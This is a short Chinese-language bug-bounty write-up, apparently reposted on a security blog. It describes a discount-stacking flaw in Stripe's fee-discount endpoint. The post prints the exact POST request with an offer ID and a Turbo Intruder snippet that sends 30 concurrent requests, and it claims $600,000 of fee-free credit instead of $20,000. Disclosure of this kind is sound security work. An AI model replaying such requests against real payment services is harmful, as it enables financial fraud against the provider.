#  折扣逻辑漏洞  
原创 h1
                    h1  迪哥讲事   2026-06-17 03:00  
  
## 正文  
  
Stripe 给我提供了一项 20,000 美元的交易手续费减免优惠（fee discount）  
  
这个接口存在并发问题  
  
使用了 Burp Turbo Intruder 对下面这个接口进行了并发攻击：  
```
/ajax/accept_fee_discount_offer



```  
  
当时没想到会成功，所以忘记截图了。）  
  
但后来发现：  
  
甚至根本不需要 race。  
  
因为我调用了 30 次请求，  
  
结果：  
  
30 个手续费减免被立刻应用到了我的账户。  
  
因此：  
  
我的账户现在拥有 600,000 美元的免手续费额度。  
  
而 Stripe 原本显然只打算给我：  
  
20,000 美元。  
  
我认为：  
  
如果继续调用这个接口，应该还能继续获得更多额度。  
  
唯一需要的是：  
  
一个有效的 fdo_ ID。  
  
我发送的请求如下  
```
POST /ajax/accept_fee_discount_offer?include_only[]=token
Host: dashboard.stripe.com

id=fdo_1Mb8GtDk3bp1ZWoGQKhSaN5E


```  
  
Turbo Intruder 脚本 该脚本：  
  
建立 30 个并发连接  
  
把请求挂到同一个 gate（race1）  
  
核心逻辑：  
```
for i in range(30):
    engine.queue(target.req, target.baseInput, gate='race1')

engine.openGate('race1')


```  
  
即：  
  
30 个请求同时发射。  
  
简简单单的漏洞,但是赏金不低
